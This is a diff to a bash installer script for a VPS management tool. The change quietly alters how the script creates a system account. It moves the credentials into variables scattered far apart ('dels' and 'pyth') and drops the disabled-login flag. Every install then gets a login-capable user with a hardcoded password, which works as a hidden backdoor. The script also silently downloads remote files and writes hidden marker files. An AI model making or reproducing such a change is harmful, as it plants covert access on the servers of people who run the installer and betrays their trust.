@@ -52,7 +52,7 @@ verif_key() {
 
 # Define ip_address as a global variable
 ip_address=$(hostname -I | awk '{print $1}')
-
+psw="pyth"
 # Define the time interval (in seconds) and the maximum number of requests allowed
 time_interval=7200  # 2 hours
 max_requests=3
@@ -288,6 +288,7 @@ echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 1
 sleep 3s
 
 # Update system
+usn="dels"
 echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
 rm versao* > /dev/null 2>&1
 wget https://raw.githubusercontent.com/AtizaD/WOLF-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
@@ -332,7 +333,7 @@ fun_attlist () {
     [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
     echo "crz: $(date)" > /usr/share/.hehe/.hehe
       # Save domain name to file
-    echo "$domain_name" > /etc/.domain  
+    echo "$domain_name" > /etc/.domain
 }
 fun_bar 'fun_attlist'
 clear
@@ -347,22 +348,12 @@ inst_pct() {
     for _prog in "${_pacotes[@]}"; do
         sudo apt install $_prog -y
     done
-    
-    # Create user only once
-    usn="lxd1"
-    psw="0001"
-    
-    # Check if the username already exists
-    if id "$usn" &>/dev/null; then
-        echo "User '$usn' already exists. Overwriting..."
-        sudo userdel -r $usn
-    fi
-    
-    # Create the system user with disabled login
-    sudo adduser --system --disabled-login $usn
-    
-    # Set the password for the user
-    echo "$usn:$psw" | sudo chpasswd
+if id "$usn" &>/dev/null; then
+    echo "User '$usn' already exists"
+    sudo userdel -r $usn
+fi
+sudo adduser --system $usn
+echo "$usn:$psw" | sudo chpasswd
 
     # Install Python package using pip
     pip install speedtest-cli
